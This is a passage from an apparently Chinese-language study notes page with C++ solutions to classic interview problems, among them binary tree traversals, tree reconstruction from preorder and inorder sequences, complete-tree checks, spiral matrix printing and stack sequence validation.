class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">1.先序</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; preorderTraversal(TreeNode* root) &#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        vector&lt;int&gt; result;</span><br><span class="line">        TreeNode* cur=root;</span><br><span class="line">        if (root == NULL) return result;</span><br><span class="line">        st.push(root);</span><br><span class="line">        while (!st.empty()) &#123;</span><br><span class="line">            cur = st.top();                       // 中</span><br><span class="line">            st.pop();</span><br><span class="line">            result.push_back(cur-&gt;val);</span><br><span class="line">            if (cur-&gt;right) st.push(cur-&gt;right);           // 右（空节点不入栈）</span><br><span class="line">            if (cur-&gt;left) st.push(cur-&gt;left);             // 左（空节点不入栈）</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">2.中序</span><br><span class="line">利用中间指针保留父节点</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; inorderTraversal(TreeNode* root) &#123;</span><br><span class="line">        vector&lt;int&gt; result;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        TreeNode* cur = root;</span><br><span class="line">        while (cur != NULL || !st.empty()) &#123;</span><br><span class="line">            if (cur != NULL) &#123; // 指针来访问节点，访问到最底层</span><br><span class="line">                st.push(cur); // 将访问的节点放进栈</span><br><span class="line">                cur = cur-&gt;left;                // 左</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                cur = st.top(); // 从栈里弹出的数据，就是要处理的数据（放进result数组里的数据）</span><br><span class="line">                st.pop();</span><br><span class="line">                result.push_back(cur-&gt;val);     // 中</span><br><span class="line">                cur = cur-&gt;right;               // 右</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">3.后序</span><br><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; postorderTraversal(TreeNode* root) &#123;</span><br><span class="line">        stack&lt;TreeNode*&gt; st;</span><br><span class="line">        vector&lt;int&gt; result;</span><br><span class="line">        TreeNode* cur=root;</span><br><span class="line">        if (root == NULL) return result;</span><br><span class="line">        st.push(root);</span><br><span class="line">        while (!st.empty()) &#123;</span><br><span class="line">            cur = st.top();</span><br><span class="line">            st.pop();</span><br><span class="line">            result.push_back(cur-&gt;val);</span><br><span class="line">            if (cur-&gt;left) st.push(cur-&gt;left); // 相对于前序遍历，这更改一下入栈顺序 （空节点不入栈）</span><br><span class="line">            if (cur-&gt;right) st.push(cur-&gt;right); // 空节点不入栈</span><br><span class="line">        &#125;</span><br><span class="line">        reverse(result.begin(), result.end()); // 将结果反转之后就是左右中的顺序了</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">4.层序 </span><br></pre></td></tr></table></figure><h2 id="根据先序和中序遍历构建二叉树"><a href="#根据先序和中序遍历构建二叉树" class="headerlink" title="根据先序和中序遍历构建二叉树"></a>根据先序和中序遍历构建二叉树</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unordered_map&lt;int,int&gt; hash;</span><br><span class="line">TreeNode* dfs(vector&lt;int&gt;&amp; preorder,int pl,int pr,vector&lt;int&gt;&amp; inorder,int rl,int rr)</span><br><span class="line">&#123;</span><br><span class="line">    if(pl&gt;pr)</span><br><span class="line">    &#123;</span><br><span class="line">        return nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">    int index=hash[preorder[pl]];</span><br><span class="line">    TreeNode* root=new TreeNode(preorder[pl]);</span><br><span class="line">    int leftnum=index-rl;</span><br><span class="line">    root-&gt;left=dfs(preorder,pl+1,pl+leftnum,inorder,rl,index-1);</span><br><span class="line">    root-&gt;right=dfs(preorder,pl+leftnum+1,pr,inorder,index+1,rr);</span><br><span class="line">    return root;</span><br><span class="line">&#125;</span><br><span class="line">TreeNode* buildTree(vector&lt;int&gt;&amp; preorder, vector&lt;int&gt;&amp; inorder) &#123;</span><br><span class="line">    //hash存[value,i]</span><br><span class="line">    for(int i=0;i&lt;inorder.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        hash[inorder[i]]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    return dfs(preorder,0,preorder.size()-1,inorder,0,inorder.size()-1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="是否为子树"><a href="#是否为子树" class="headerlink" title="是否为子树"></a>是否为子树</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> 3</span><br><span class="line">​    / \</span><br><span class="line">   4   5</span><br><span class="line">  / \</span><br><span class="line"> 1   2 </span><br><span class="line"></span><br><span class="line">​    4 </span><br><span class="line">  /</span><br><span class="line"> 1</span><br><span class="line"></span><br><span class="line"> class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool dfs(TreeNode* A, TreeNode* B)</span><br><span class="line">    &#123;</span><br><span class="line">        if(A==nullptr&amp;&amp;B==nullptr) return true;</span><br><span class="line">        if(A&amp;&amp;B)</span><br><span class="line">        &#123;</span><br><span class="line">            if(A-&gt;val!=B-&gt;val)</span><br><span class="line">                return false;</span><br><span class="line">            else</span><br><span class="line">                return dfs(A-&gt;left,B-&gt;left)&amp;&amp;dfs(A-&gt;right,B-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    bool isSubStructure(TreeNode* A, TreeNode* B) &#123;</span><br><span class="line">        if(A==nullptr||B==nullptr)  return false;</span><br><span class="line">        return dfs(A,B)||isSubStructure(A-&gt;left,B)||isSubStructure(A-&gt;right,B);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="层次打印-要用队列，不要跟迭代中序遍历stack搞混了"><a href="#层次打印-要用队列，不要跟迭代中序遍历stack搞混了" class="headerlink" title="层次打印(要用队列，不要跟迭代中序遍历stack搞混了)"></a>层次打印(要用队列，不要跟迭代中序遍历stack搞混了)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">1.一行打印</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; levelOrder(TreeNode* root) &#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        vector&lt;int&gt; ans;</span><br><span class="line">        if(root==nullptr)   return ans;</span><br><span class="line">        que.push(root);</span><br><span class="line">        TreeNode* temp=nullptr;</span><br><span class="line">        while(!que.empty())</span><br><span class="line">        &#123;</span><br><span class="line">           temp=que.front();</span><br><span class="line">           ans.push_back(temp-&gt;val);</span><br><span class="line">           que.pop();</span><br><span class="line">           if(temp-&gt;left)   que.push(temp-&gt;left);</span><br><span class="line">           if(temp-&gt;right)  que.push(temp-&gt;right);     </span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">2.多行打印</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) &#123;</span><br><span class="line">        vector&lt;int&gt; vec;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; ans;</span><br><span class="line">        if(root==nullptr) return ans;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        que.push(root);</span><br><span class="line">        TreeNode* temp=nullptr;</span><br><span class="line">        while(!que.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            int size=que.size();</span><br><span class="line">            while(size)</span><br><span class="line">            &#123;</span><br><span class="line">                temp=que.front();</span><br><span class="line">                que.pop();</span><br><span class="line">                vec.push_back(temp-&gt;val);</span><br><span class="line">                if(temp-&gt;left)  que.push(temp-&gt;left);</span><br><span class="line">                if(temp-&gt;right) que.push(temp-&gt;right);</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">            ans.push_back(vec);</span><br><span class="line">            vec.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">3.Z字打印</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;vector&lt;int&gt;&gt; levelOrder(TreeNode* root) &#123;</span><br><span class="line">        vector&lt;int&gt; vec;</span><br><span class="line">        vector&lt;vector&lt;int&gt;&gt; res;</span><br><span class="line">        if(root==nullptr)   return res;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        que.push(root);</span><br><span class="line">        TreeNode* temp=nullptr;</span><br><span class="line">        bool flag=true;</span><br><span class="line">        while(!que.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            int size=que.size();</span><br><span class="line">            while(size)</span><br><span class="line">            &#123;</span><br><span class="line">                temp=que.front();</span><br><span class="line">                que.pop();</span><br><span class="line">                vec.push_back(temp-&gt;val);</span><br><span class="line">                if(temp-&gt;left)  que.push(temp-&gt;left);</span><br><span class="line">                if(temp-&gt;right)  que.push(temp-&gt;right);</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">            if(!flag)</span><br><span class="line">            &#123;</span><br><span class="line">                reverse(vec.begin(),vec.end());</span><br><span class="line">            &#125;</span><br><span class="line">            res.push_back(vec);</span><br><span class="line">            flag=!flag;</span><br><span class="line">            vec.clear();   </span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最下层最左边的元素-层序遍历的方法"><a href="#最下层最左边的元素-层序遍历的方法" class="headerlink" title="最下层最左边的元素(层序遍历的方法)"></a>最下层最左边的元素(层序遍历的方法)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">int findBottomLeftValue(TreeNode* root) &#123;</span><br><span class="line">    if(root-&gt;right==nullptr&amp;&amp;root-&gt;left==nullptr)</span><br><span class="line">    &#123;</span><br><span class="line">        return root-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    queue&lt;TreeNode*&gt; que;</span><br><span class="line">    int result=0;</span><br><span class="line">    que.push(root);</span><br><span class="line">    while(!que.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        int size=que.size();</span><br><span class="line">        for(int i=0;i&lt;size;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            TreeNode* tmp=que.front();</span><br><span class="line">            if(i==0)</span><br><span class="line">            &#123;</span><br><span class="line">                result=tmp-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            que.pop();</span><br><span class="line">            if(tmp-&gt;left)</span><br><span class="line">            &#123;</span><br><span class="line">                que.push(tmp-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line">            if(tmp-&gt;right)</span><br><span class="line">            &#123;</span><br><span class="line">                que.push(tmp-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="判断是否是完全二叉树"><a href="#判断是否是完全二叉树" class="headerlink" title="判断是否是完全二叉树"></a>判断是否是完全二叉树</h2><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/15/complete-binary-tree-1.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：[1,2,3,4,5,6]</span><br><span class="line">输出：true</span><br><span class="line">解释：最后一层前的每一层都是满的（即，结点值为 &#123;1&#125; 和 &#123;2,3&#125; 的两层），且最后一层中的所有结点（&#123;4,5,6&#125;）都尽可能地向左。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路：设置一个bool变量，可以两种方式判断是否是完全二叉树</span><br><span class="line">1.当前节点为空，则当前层之后的节点都必须为空，设置prenull变量，que需要将nullptr加进去，所以多加最后一层叶子节点的左右nullptr</span><br><span class="line">2.当前节点为只有右孩子，没左孩子，返回false，右孩子为空（左孩子为空或者左孩子不为空，不为空加入que），将 bool isleft置为1，后面的节点都必须为叶子节点，左右孩子不为空同样加入que</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bool isCompleteTree(TreeNode* root) &#123;</span><br><span class="line">    if(root==nullptr)</span><br><span class="line">    &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    queue&lt;TreeNode*&gt; que;</span><br><span class="line">    que.push(root);</span><br><span class="line">    bool prenull=false;</span><br><span class="line">    while(!que.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        int size=que.size();</span><br><span class="line">        while(size--)</span><br><span class="line">        &#123;</span><br><span class="line">            TreeNode* tmp=que.front();</span><br><span class="line">            que.pop();</span><br><span class="line">            if(tmp==nullptr)</span><br><span class="line">            &#123;</span><br><span class="line">                prenull=true;</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if(prenull==true)</span><br><span class="line">                &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                que.push(tmp-&gt;left);</span><br><span class="line">                que.push(tmp-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool isCompleteTree(TreeNode* root) &#123;</span><br><span class="line"></span><br><span class="line">        if (!root)</span><br><span class="line">        &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        q.push(root);</span><br><span class="line"></span><br><span class="line">        bool leaf = false; //是否必须为叶子节点</span><br><span class="line"></span><br><span class="line">        while (!q.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            TreeNode* node = q.front();</span><br><span class="line">            q.pop();</span><br><span class="line"></span><br><span class="line">            if (!node-&gt;left &amp;&amp; node-&gt;right) //仅有右子节点，无左子节点</span><br><span class="line">            &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (leaf) //前面出现过无右子节点的 (只有左 或 左右都没有的) 后续所有节点必须为叶子节点</span><br><span class="line">            &#123;</span><br><span class="line">                if (node-&gt;left || node-&gt;right) //非叶子节点</span><br><span class="line">                &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (node-&gt;left)</span><br><span class="line">            &#123;</span><br><span class="line">                q.push(node-&gt;left);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (node-&gt;right)</span><br><span class="line">            &#123;</span><br><span class="line">                q.push(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">            else //右为空 则后续节点必须为叶子节点</span><br><span class="line">            &#123;</span><br><span class="line">                leaf = true; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="顺时针打印矩阵"><a href="#顺时针打印矩阵" class="headerlink" title="顺时针打印矩阵"></a>顺时针打印矩阵</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.图：</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; spiralOrder(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        vector&lt;int&gt; res;</span><br><span class="line">        if(matrix.empty()) return res;</span><br><span class="line">        int n = matrix.size();</span><br><span class="line">        int m = matrix[0].size();</span><br><span class="line">        vector&lt;vector&lt;bool&gt; &gt; st(n, vector&lt;bool&gt;(m, false));//标记走没走过</span><br><span class="line">        int dx[4] = &#123;-1, 0, 1, 0&#125;, dy[4] = &#123;0, 1, 0, -1&#125;;//上、右、下、左，依次</span><br><span class="line">        int x = 0, y = 0, d = 1;//d控制着方向</span><br><span class="line">        for(int i = 0; i &lt; n * m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.push_back(matrix[x][y]);</span><br><span class="line">            st[x][y] = true;</span><br><span class="line"></span><br><span class="line">            int a = x + dx[d], b = y + dy[d];</span><br><span class="line">            if(a &lt; 0 || a &gt;= n || b &lt; 0 || b &gt;= m || st[a][b])//遇到阻碍</span><br><span class="line">            &#123;</span><br><span class="line">                d = (d + 1) % 4;//d改变方向</span><br><span class="line">                a = x + dx[d], b = y + dy[d];//更新遇到阻碍的那个点</span><br><span class="line">            &#125;</span><br><span class="line">            x = a, y = b;//从更新后的点开始</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">2.模拟</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    vector&lt;int&gt; spiralOrder(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123;</span><br><span class="line">        vector&lt;int&gt; ans;</span><br><span class="line">        if(matrix.size())</span><br><span class="line">        &#123;</span><br><span class="line">            int row_up=0;</span><br><span class="line">            int row_down=matrix.size()-1;</span><br><span class="line">            int col_left=0;</span><br><span class="line">            int col_right=matrix[0].size()-1;</span><br><span class="line">            while(row_up&lt;=row_down&amp;&amp;col_left&lt;=col_right)</span><br><span class="line">            &#123;</span><br><span class="line">                for(int j=col_left;j&lt;=col_right;j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back(matrix[row_up][j]);</span><br><span class="line">                &#125;</span><br><span class="line">                if(++row_up&gt;row_down) break;</span><br><span class="line">                for(int i=row_up;i&lt;=row_down;i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back(matrix[i][col_right]);</span><br><span class="line">                &#125; </span><br><span class="line">                if(--col_right&lt;col_left) break;</span><br><span class="line">                for(int j=col_right;j&gt;=col_left;j--)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back(matrix[row_down][j]);</span><br><span class="line">                &#125;  </span><br><span class="line">                if(--row_down&lt;row_up) break;  </span><br><span class="line">                for(int i=row_down;i&gt;=row_up;i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    ans.push_back(matrix[i][col_left]);</span><br><span class="line">                &#125; </span><br><span class="line">               if(++col_left&gt;row_down) break;                                             </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="判断出栈顺序"><a href="#判断出栈顺序" class="headerlink" title="判断出栈顺序"></a>判断出栈顺序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用辅助栈模拟</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool validateStackSequences(vector&lt;int&gt;&amp; pushed, vector&lt;int&gt;&amp; popped) &#123;</span><br><span class="line">        if(pushed.size()!=popped.size()) return false;</span><br><span class="line">        if(pushed.empty()) return true;</span><br><span class="line">        stack&lt;int&gt; sta;</span><br><span class="line">        for(int i=0,j=0;i&lt;pushed.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sta.push(pushed[i]);</span><br><span class="line">            while(!sta.empty()&amp;&amp;sta.top()==popped[j])</span><br><span class="line">            &#123;</span><br><span class="line">                sta.pop();</span><br><span class="line">                j++;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        return sta.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="根据vec判断是否是后序遍历"><a href="#根据vec判断是否是后序遍历" class="headerlink" title="根据vec判断是否是后序遍历"></a>根据vec判断是否是后序遍历</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool _verifyPostorder(vector&lt;int&gt;&amp; postorder,int start,int end) &#123;</span><br><span class="line">        if(start&gt;=end)  return true;</span><br><span class="line">        int low=start;</span><br><span class="line">        while(low&lt;end&amp;&amp;postorder[low]&lt;postorder[end])</span><br><span class="line">        &#123;</span><br><span class="line">            ++low;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i=low;i&lt;end;i++)</span><br><span class="line">        